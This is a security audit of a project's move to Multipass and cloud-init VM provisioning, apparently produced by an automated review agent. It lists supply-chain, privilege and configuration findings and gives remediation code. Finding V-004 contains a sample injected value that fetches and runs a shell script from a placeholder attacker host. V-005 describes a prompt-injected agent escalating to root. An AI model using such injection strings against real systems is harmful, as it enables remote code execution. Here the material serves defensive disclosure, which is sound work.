# Security Audit: Cloud Image Migration (Multipass + Cloud-Init)

**Date:** 2026-02-25
**Auditor:** Security Review Agent
**Input Type:** System/Design + Codebase
**Scope:** `docs/SPEC-cloud-image-migration.md`, `cloud-init.yaml`, `docker-compose.yml`, `cli/src/multipass.rs`, `cli/src/workspace/vm.rs`, `cli/src/workspace/image.rs`, `cli/src/commands/start.rs`, `services/host-init/Dockerfile`, `.github/workflows/release.yml`, `packer/scripts/*.sh`, `scripts/poc-cloud-init.sh`

## 1. Security Posture Summary

**Risk Score:** 3.5 / 10
**Overall Assessment:** The migration is architecturally sound and preserves existing hardening controls. Removing yq from the VM provisioning path (agents pre-bundled at CI time) eliminates the highest supply chain risk. Remaining issues are spec-to-implementation divergences in `cloud-init.yaml` (missing retry loops, unlocked passwords, missing systemd unit) and mutable GHCR image tags.

### The Kill Chain

The most likely path to compromise chains two findings:

1. **V-003** — GHCR images are referenced by mutable version tags (no `@sha256:` digest pinning). An attacker who compromises a maintainer account or leaks a GitHub Actions token can overwrite a tag with a poisoned image.
2. **V-005** — The `ubuntu` VM user has `lock_passwd: false` and passwordless `sudo`. If the poisoned image escapes the container (e.g., via Sysbox vulnerability), the attacker gains root-equivalent access to the VM host and all container secrets.

### Trust Boundary Analysis

| Boundary | Risk | Notes |
|----------|------|-------|
| Host → VM (cloud-init) | **Low** | Network-dependent provisioning at launch time. Docker and Sysbox downloads are verified (GPG/SHA256). yq removed from cloud-init (agents pre-bundled in CI). |
| CLI → VM (multipass transfer) | **Low** | Config bundle transferred over Multipass's local socket. No network exposure. Existing pattern. |
| VM → GHCR (docker compose pull) | **Medium** | New trust dependency on GHCR availability and image tag integrity at launch time. Images are referenced by mutable version tags, not content-addressable digests. |
| workspace → toolbox | **Low** | Unchanged by this migration. |
| workspace → gateway | **Low** | Unchanged by this migration. |
| gateway → governance | **Low** | Unchanged by this migration. |

## 2. Vulnerability Report

### HIGH

#### V-001: Remove yq From Cloud-Init — Residual CLI Dependency on yq Inside VM

- **OWASP ASI:** ASI04 (Supply Chain)
- **CWE:** CWE-494 (Download of Code Without Integrity Check)
- **CVSS:** 4.8 (AV:N/AC:H/PR:N/UI:N/S:U/C:N/I:H/A:N)
- **Location:** `cloud-init.yaml:90-92` — yq download in `runcmd`; `cli/src/commands/agent.rs:294-296` and `cli/src/commands/agent.rs:470` — CLI shells out to `yq` inside VM
- **Exploit Scenario:**
  1. Agents are now pre-bundled in the config tarball at CI time, so `generate-agent.sh` no longer needs to run inside the VM. This eliminates the primary yq use case.
  2. However, the CLI still calls `yq` inside the VM for `polis agent list` (reads `metadata.name/version/description` from `agent.yaml`) and `polis agent shell` (reads `spec.runtime.user`).
  3. If yq is removed from cloud-init but these CLI commands are not updated, `polis agent list` and `polis agent shell` will silently fail or return incorrect data.
  4. If yq is kept in cloud-init solely for these two read-only operations, the supply chain risk remains (unverified binary download).
- **Evidence:** The live `cloud-init.yaml` downloads yq without SHA256 verification:
  ```yaml
  - wget -qO /usr/local/bin/yq https://github.com/mikefarah/yq/releases/download/v4.44.6/yq_linux_amd64
  - chmod +x /usr/local/bin/yq
  ```
  The CLI uses yq at `agent.rs:294` (`yq -o=json '.metadata.name'`) and `agent.rs:470` (`yq '.spec.runtime.user // "root"'`). Both are simple key lookups that can be replaced.
- **Remediation:** Remove yq from `cloud-init.yaml` entirely. Replace the two CLI call sites with a lightweight alternative that's already available in the VM:

  For `agent list` — use `grep`/`sed` or parse YAML in Rust (the CLI already has `serde_yaml` or can add it):
  ```rust
  // Option A: Parse agent.yaml in the CLI after reading it via multipass exec
  let yaml_out = mp.exec(&["cat", &format!("{VM_ROOT}/agents/{name}/agent.yaml")]).await?;
  let manifest: serde_yaml::Value = serde_yaml::from_slice(&yaml_out.stdout)?;
  let agent_name = manifest["metadata"]["name"].as_str().unwrap_or("unknown");

  // Option B: Use jq (already installed via cloud-init packages list) after yq-to-json isn't needed
  // since agent artifacts are pre-generated, the .generated/ dir can include a metadata.json
  ```

  For `agent shell` — include `runtime.user` in the pre-generated artifacts:
  ```bash
  # In generate-agent.sh (runs at CI time), add:
  yq '.spec.runtime.user // "root"' "${MANIFEST}" > "${OUT_DIR}/runtime-user"
  ```
  Then the CLI reads the flat file instead of calling yq:
  ```rust
  let user_out = mp.exec(&["cat", &format!("{VM_ROOT}/agents/{name}/.generated/runtime-user")]).await?;
  ```

---

#### V-002: Docker `apt-get update` Has No Retry Loop in Live `cloud-init.yaml`

- **OWASP ASI:** ASI04 (Supply Chain)
- **CWE:** CWE-636 (Not Failing Securely)
- **CVSS:** 5.9 (AV:N/AC:H/PR:N/UI:N/S:U/C:N/I:H/A:N)
- **Location:** `cloud-init.yaml:95` — Docker install block in `runcmd`
- **Exploit Scenario:**
  1. Transient network failure during `apt-get update` causes the command to fail.
  2. Cloud-init `runcmd` continues to the next command (cloud-init does not abort on individual runcmd failures by default unless `set -e` is used within the block).
  3. `apt-get install -y docker-ce ...` runs against stale/empty package lists, potentially installing an older cached version or failing silently.
  4. If Docker install fails but cloud-init reports success, the CLI's `verify_cloud_init()` check may pass (cloud-init status can be `done` even if individual runcmd items fail, depending on the module configuration).
- **Evidence:** The spec (§ Architecture Review F-005) states retry loops were added. The spec's cloud-init block includes a 3-attempt retry for `apt-get update`. The live `cloud-init.yaml` has no retry — it calls `apt-get update` once. Same divergence for the Sysbox download (no retry in live file, retry in spec).
- **Remediation:** Sync the live `cloud-init.yaml` Docker install block with the spec version that includes retry loops:
  ```yaml
  - |
    DOCKER_GPG_FINGERPRINT="9DC858229FC7DD38854AE2D88D81803C0EBFCD88"
    install -m 0755 -d /etc/apt/keyrings
    curl -fsSL https://download.docker.com/linux/ubuntu/gpg | tee /etc/apt/keyrings/docker.asc > /dev/null
    chmod a+r /etc/apt/keyrings/docker.asc
    ACTUAL=$(gpg --show-keys --with-colons --with-fingerprint /etc/apt/keyrings/docker.asc 2>/dev/null | awk -F: '/^fpr/{print $10; exit}')
    if [ "${ACTUAL}" != "${DOCKER_GPG_FINGERPRINT}" ]; then
      echo "FATAL: Docker GPG fingerprint mismatch (got ${ACTUAL})" >&2
      exit 1
    fi
    echo "deb [arch=$(dpkg --print-architecture) signed-by=/etc/apt/keyrings/docker.asc] https://download.docker.com/linux/ubuntu $(. /etc/os-release && echo "${VERSION_CODENAME}") stable" | tee /etc/apt/sources.list.d/docker.list > /dev/null
    for i in 1 2 3; do
      apt-get update && break
      echo "apt-get update failed (attempt $i/3), retrying in 10s..." >&2
      sleep 10
    done
    apt-get install -y docker-ce docker-ce-cli containerd.io docker-buildx-plugin docker-compose-plugin
    usermod -aG docker ubuntu
  ```

---

#### V-003: GHCR Images Referenced by Mutable Tags, Not Content-Addressable Digests

- **OWASP ASI:** ASI04 (Supply Chain)
- **CWE:** CWE-829 (Inclusion of Functionality from Untrusted Control Sphere)
- **CVSS:** 6.6 (AV:N/AC:H/PR:H/UI:N/S:U/C:H/I:H/A:N)
- **Location:** `docker-compose.yml` — all `image:` directives use `${POLIS_*_VERSION:-latest}` tags; spec § GHCR Image Tagging Strategy
- **Exploit Scenario:**
  1. Attacker compromises a GHCR maintainer account (or GitHub Actions token leaks via workflow log).
  2. Attacker pushes a malicious image to `ghcr.io/odralabshq/polis-workspace-oss:v0.4.0`, overwriting the existing tag.
  3. User runs `polis start` → CLI sets version env vars → `docker compose pull` fetches the poisoned image.
  4. Poisoned workspace container runs with Sysbox runtime, gaining full inner-container root.
- **Evidence:** The current baked-image approach uses `docker load` from a signed tarball with SHA256 sidecar verification (`image.rs:verify_image_integrity`). The migration removes this verification entirely — `docker compose pull` trusts GHCR tag resolution with no content verification. The `scanner-init` and `state-init` containers currently use `@sha256:` digest pinning (`dhi.io/alpine-base:3.23-dev@sha256:2b318097...`), proving the project already uses digest pinning where it matters. The migration to `polis-init-oss` drops this pinning.
- **Remediation:** Pin GHCR images by digest in the compose file, or implement post-pull digest verification in the CLI:
  ```rust
  // After docker compose pull, verify digests match expected values
  // Option A: Pin in compose file (preferred)
  // image: ghcr.io/odralabshq/polis-workspace-oss:v0.4.0@sha256:<digest>
  //
  // Option B: CLI verification after pull
  async fn verify_image_digests(mp: &impl Multipass, expected: &HashMap<String, String>) -> Result<()> {
      for (image, expected_digest) in expected {
          let output = mp.exec(&["docker", "inspect", "--format", "{{index .RepoDigests 0}}", image]).await?;
          let actual = String::from_utf8_lossy(&output.stdout);
          if !actual.contains(expected_digest) {
              anyhow::bail!("Image digest mismatch for {image}");
          }
      }
      Ok(())
  }
  ```
  At minimum, the release workflow should output a digest manifest file that the CLI can verify against after pulling.

### MEDIUM

#### V-004: POC Script Runs `sudo` Commands Inside VM Without Input Validation

- **OWASP ASI:** ASI05 (Code Execution)
- **CWE:** CWE-78 (OS Command Injection)
- **CVSS:** 5.3 (AV:L/AC:L/PR:L/UI:N/S:U/C:N/I:H/A:N)
- **Location:** `scripts/poc-cloud-init.sh:139-145` — `phase2_bundle_and_transfer()` function
- **Exploit Scenario:**
  1. User sets `VM_NAME` environment variable to a value containing shell metacharacters: `VM_NAME="test; curl evil.com/shell.sh | bash #"`
  2. The `multipass exec "${VM_NAME}" -- bash -c "cd ${VM_POLIS_ROOT} && sudo tar ..."` command injects the payload into the bash `-c` string.
  3. Arbitrary commands execute inside the VM as root.
- **Evidence:** `VM_NAME` is read from environment at line 18 (`VM_NAME="${VM_NAME:-polis-test}"`) and interpolated unquoted into `bash -c` strings throughout the script (lines 139, 155, 165, 175, 195, 210, etc.). While Multipass itself may reject invalid VM names, the `bash -c` interpolation happens before Multipass validates the name.
- **Remediation:** Validate `VM_NAME` at the top of the script:
  ```bash
  if [[ ! "${VM_NAME}" =~ ^[a-zA-Z][a-zA-Z0-9-]*$ ]]; then
      log_error "Invalid VM_NAME: must be alphanumeric with hyphens, starting with a letter"
      exit 1
  fi
  ```

---

#### V-005: `ubuntu` User Has Passwordless Sudo and No Password Set

- **OWASP ASI:** ASI05 (Code Execution)
- **CWE:** CWE-250 (Execution with Unnecessary Privileges)
- **CVSS:** 5.1 (AV:L/AC:L/PR:H/UI:N/S:U/C:H/I:H/A:N)
- **Location:** `cloud-init.yaml:28-31` — `users` block; `docs/SPEC-cloud-image-migration.md` § Cloud-Init Design
- **Exploit Scenario:**
  1. Agent in workspace container achieves code execution (via tool misuse or prompt injection).
  2. Agent uses `multipass exec` or SSH to the VM host (workspace has network access to the VM's internal bridge).
  3. `ubuntu` user has `NOPASSWD:ALL` sudo — agent escalates to root immediately.
  4. Root on VM host can access Docker socket, read all container secrets, modify iptables rules.
- **Evidence:** The cloud-init sets `lock_passwd: false` and `sudo: ALL=(ALL) NOPASSWD:ALL`. The Packer build's cleanup step locks both `ubuntu` and `root` passwords (`sudo passwd -l ubuntu`, `sudo passwd -l root` in `polis-vm.pkr.hcl:260-261`). The cloud-init migration does not replicate this lockdown. The `lock_passwd: false` directive explicitly keeps the password unlocked.
- **Remediation:** The cloud-init should lock the password after provisioning. Add to the end of `runcmd`:
  ```yaml
  # Lock ubuntu password (CLI uses multipass exec, not SSH password auth)
  - passwd -l ubuntu
  - passwd -l root
  ```
  And change `lock_passwd: false` to `lock_passwd: true` in the users block (the CLI uses `multipass exec` which doesn't need password auth).

---

#### V-006: Packer `install-polis.sh` Downloads yq Without Version Pin or SHA256 (Pre-existing, Deleted by Migration)

- **OWASP ASI:** ASI04 (Supply Chain)
- **CWE:** CWE-494 (Download of Code Without Integrity Check)
- **CVSS:** N/A (code being deleted)
- **Location:** `packer/scripts/install-polis.sh:22`
- **Description:** Pre-existing issue. The Packer script downloads yq via `/latest/` with no checksum. Since the entire `packer/` directory is being deleted and yq is being removed from the VM provisioning path entirely (agents pre-bundled at CI time), this finding is resolved by the migration itself. No action needed.

---

#### V-007: Docker Socket Mounted Read-Only in `host-init` but Still Exploitable

- **OWASP ASI:** ASI02 (Tool Misuse)
- **CWE:** CWE-269 (Improper Privilege Management)
- **CVSS:** 5.3 (AV:L/AC:H/PR:H/UI:N/S:C/C:H/I:N/A:N)
- **Location:** `docker-compose.yml:175` — `host-init` service, `/var/run/docker.sock:/var/run/docker.sock:ro`
- **Exploit Scenario:**
  1. The `host-init` container mounts the Docker socket read-only.
  2. Docker socket `:ro` mount only prevents *write* operations at the filesystem level, but the Docker API is accessed via the socket protocol, not file writes. Read-only mount does NOT prevent `docker run --privileged` API calls.
  3. If `host-init` image is compromised (supply chain), the container can use the Docker API to spawn a privileged container and escape to the host.
- **Evidence:** The `host-init` container runs with `network_mode: host` and `cap_add: NET_ADMIN`. It needs the Docker socket only to run `docker network inspect`. The `:ro` flag on a Unix socket does not restrict API operations — this is a well-documented Docker security concern. However, the container runs as a one-shot (`restart: "no"`) and exits immediately, limiting the attack window.
- **Remediation:** This is pre-existing and not introduced by the migration. The unified `polis-init` image should preserve the current security posture. For defense-in-depth, consider replacing the Docker socket mount with a pre-computed network bridge ID passed as an environment variable:
  ```yaml
  host-init:
    image: ghcr.io/odralabshq/polis-init-oss:${POLIS_HOST_INIT_VERSION:-latest}
    environment:
      - INTERNAL_BRIDGE_ID=${POLIS_INTERNAL_BRIDGE_ID}
    # Remove: /var/run/docker.sock:/var/run/docker.sock:ro
    command: ["sh", "-c", "iptables -C DOCKER-USER -i br-${INTERNAL_BRIDGE_ID} ..."]
  ```

### LOW / INFORMATIONAL

#### V-008: `cloud-init status` Check May Not Detect Partial Failures

- **OWASP ASI:** ASI08 (Cascading Failures)
- **CWE:** CWE-754 (Improper Check for Unusual or Exceptional Conditions)
- **Location:** Spec § CLI Changes — `verify_cloud_init()` function
- **Description:** The proposed `verify_cloud_init()` checks for `"error"` or `"degraded"` in `cloud-init status` output. However, cloud-init's `runcmd` module runs all commands in a single script by default. If an individual command fails but the script continues (no `set -e`), cloud-init may report `status: done` rather than `status: error`. The live `cloud-init.yaml` runcmd blocks use `|` (literal block scalar) which runs as a single shell invocation — if the shell block doesn't use `set -e`, failures within the block are swallowed.
- **Evidence:** The Docker install block and Sysbox install block in the live `cloud-init.yaml` do NOT include `set -e`. The Packer scripts (`install-docker.sh:6`, `install-sysbox.sh:5`) both use `set -euo pipefail`. The cloud-init runcmd blocks lost this safety net.
- **Remediation:** Add `set -euo pipefail` to the beginning of each multi-line runcmd block:
  ```yaml
  - |
    set -euo pipefail
    DOCKER_GPG_FINGERPRINT="9DC858229FC7DD38854AE2D88D81803C0EBFCD88"
    ...
  ```

---

#### V-009: Release Workflow Signing Key Handled in Memory

- **OWASP ASI:** ASI03 (Identity Abuse)
- **CWE:** CWE-312 (Cleartext Storage of Sensitive Information)
- **Location:** `.github/workflows/release.yml:148-155` — VM signing step
- **Description:** The `POLIS_SIGNING_KEY` secret is base64-decoded to `/tmp/polis-release.key`, used for signing, then deleted. The key exists on disk briefly during the CI run. This is standard practice for GitHub Actions (secrets are masked in logs), but the key is written to the runner's `/tmp` which is shared across steps. If a subsequent step is compromised (e.g., via a supply chain attack on an action), it could read the key before deletion.
- **Evidence:** The key is deleted with `rm -f /tmp/polis-release.key` after use. The risk is low because GitHub-hosted runners are ephemeral. This is pre-existing behavior, not introduced by the migration.
- **Remediation:** Best practice — use a `trap` to ensure cleanup on failure:
  ```bash
  echo "${POLIS_SIGNING_KEY}" | base64 -d > /tmp/polis-release.key
  trap 'rm -f /tmp/polis-release.key' EXIT
  ```

---

#### V-010: `polis-init` Dockerfile Uses DHI Base Image Without Public Verification Path

- **OWASP ASI:** ASI04 (Supply Chain)
- **CWE:** CWE-829 (Inclusion of Functionality from Untrusted Control Sphere)
- **Location:** `services/host-init/Dockerfile:4` — `FROM dhi.io/alpine-base:3.23-dev@sha256:2b318097...`
- **Description:** The base image is pinned by digest (`@sha256:2b318097...`), which is good. However, `dhi.io` is a private registry requiring authentication. Users cannot independently verify the base image contents. The migration consolidates three init containers onto this single image, increasing the blast radius if the base image is compromised.
- **Evidence:** The digest pin prevents tag mutation attacks. The risk is limited to the initial build in CI (where DHI auth is configured). End users pull from GHCR, not DHI. This is pre-existing.
- **Remediation:** Informational. Consider publishing a Software Bill of Materials (SBOM) for the `polis-init-oss` image to GHCR alongside the image, enabling users to audit the contents.

---

#### V-011: Hardening Parity Gap — No `polis.service` Systemd Unit in Cloud-Init Path

- **OWASP ASI:** ASI08 (Cascading Failures)
- **CWE:** CWE-1188 (Initialization with Hard-Coded Network Resource Configuration)
- **Location:** Spec § Two-Phase Provisioning vs. `packer/scripts/install-polis.sh:27-40`
- **Description:** The Packer build creates a `polis.service` systemd unit that auto-starts Docker Compose on boot (with `ExecStartPre=/opt/polis/scripts/setup-certs.sh`). The cloud-init migration does not create this unit. After a VM reboot (e.g., `multipass restart polis`), services will not auto-start. The CLI's `vm::restart()` calls `start_services()` which runs `sudo systemctl start polis`, but this service won't exist.
- **Evidence:** `vm.rs:159` — `start_services()` runs `mp.exec(&["sudo", "systemctl", "start", "polis"])`. The goss test at `goss-spec.yaml` validates `polis.service` exists and is enabled. The cloud-init creates `/opt/polis` but does not install the systemd unit.
- **Remediation:** Add the systemd unit to cloud-init's `write_files`:
  ```yaml
  - path: /etc/systemd/system/polis.service
    content: |
      [Unit]
      Description=Polis Secure Workspace
      After=docker.service sysbox.service
      Requires=docker.service

      [Service]
      Type=oneshot
      RemainAfterExit=yes
      WorkingDirectory=/opt/polis
      ExecStartPre=/opt/polis/scripts/setup-certs.sh
      ExecStart=/usr/bin/docker compose up -d
      ExecStop=/usr/bin/docker compose down
      TimeoutStartSec=120
      User=root

      [Install]
      WantedBy=multi-user.target
    permissions: '0644'
  ```
  And add to `runcmd`:
  ```yaml
  - systemctl daemon-reload
  - systemctl enable polis.service
  ```

## 3. Compliance Checklist

| Control | Status | Notes |
|---------|--------|-------|
| Seccomp profile applied | ✅ | All containers in `docker-compose.yml` have `seccomp=` profiles. Unchanged by migration. |
| AppArmor profile applied | ✅ | `cloud-init.yaml` enables AppArmor. Matches Packer `harden-vm.sh`. |
| No privileged containers | ✅ | No `privileged: true` in `docker-compose.yml`. `host-init` uses targeted `cap_add: NET_ADMIN` only. |
| No CAP_SYS_ADMIN | ✅ | No container uses `CAP_SYS_ADMIN`. |
| Credentials in vault (not env) | ✅ | Docker secrets used for Valkey passwords. No credentials in environment variables. |
| Dependencies pinned by hash | ⚠️ | Sysbox: SHA256 ✅. Docker GPG: fingerprint ✅. yq: **removed from VM** ✅. GHCR images: **mutable tags, no digest** ❌. |
| MCP tools have capability bounds | ✅ | Unchanged by migration. Toolbox config not modified. |
| g3proxy allowlist is minimal | ✅ | Unchanged by migration. Gate config not modified. |
| Sysctl hardening applied | ✅ | `cloud-init.yaml` writes `99-polis-hardening.conf` with ASLR, dmesg_restrict, kptr_restrict, suid_dumpable, ptrace_scope. Matches Packer. |
| Audit rules applied | ✅ | Docker audit rules written to `/etc/audit/rules.d/docker.rules`. Matches Packer. |
| Docker `no-new-privileges` | ✅ | Set in `daemon.json` via cloud-init. |
| Docker `userland-proxy: false` | ✅ | Set in `daemon.json` via cloud-init. |
| `live-restore` correctly omitted | ✅ | Spec correctly identifies Sysbox incompatibility. Cloud-init omits it. |
| Password accounts locked | ❌ | Cloud-init sets `lock_passwd: false`. Packer locked both accounts. See V-005. |
| Systemd unit for auto-restart | ❌ | Cloud-init does not create `polis.service`. See V-011. |

## 4. Recommendations

### Immediate (Block Release)

- **Fix V-001:** Remove yq from `cloud-init.yaml` entirely. Pre-bundle agent artifacts (including `.generated/` output) in the config tarball at CI time. Update `cli/src/commands/agent.rs` to read pre-generated flat files instead of shelling out to `yq` inside the VM (two call sites: `agent list` at line 294 and `agent shell` at line 470).
- **Fix V-002:** Add retry loops to Docker `apt-get update` and Sysbox download in the live `cloud-init.yaml`. Add `set -euo pipefail` to all multi-line runcmd blocks (V-008).
- **Fix V-005:** Lock `ubuntu` and `root` passwords in cloud-init runcmd. Change `lock_passwd: false` to `lock_passwd: true`.
- **Fix V-011:** Add `polis.service` systemd unit to cloud-init `write_files` and enable it in `runcmd`.

### Short-Term (Next Sprint)

- **Address V-003:** Implement image digest verification. Either pin images by `@sha256:` digest in the compose file (requires updating digests per release), or add post-pull digest verification in the CLI. At minimum, publish a digest manifest as a release artifact.
- **Address V-004:** Add input validation for `VM_NAME` in the POC script.
- **Address V-007:** Evaluate removing the Docker socket mount from `host-init` by pre-computing the bridge ID.

### Long-Term (Roadmap)

- Publish SBOM for all GHCR images (V-010).
- Implement Sigstore/cosign image signing for GHCR images to provide cryptographic verification independent of tag mutability.
- Add a `polis doctor --deep` command that validates VM hardening state (replacement for goss test suites).
- Consider implementing a post-launch integrity check that verifies all cloud-init-written files match expected checksums.
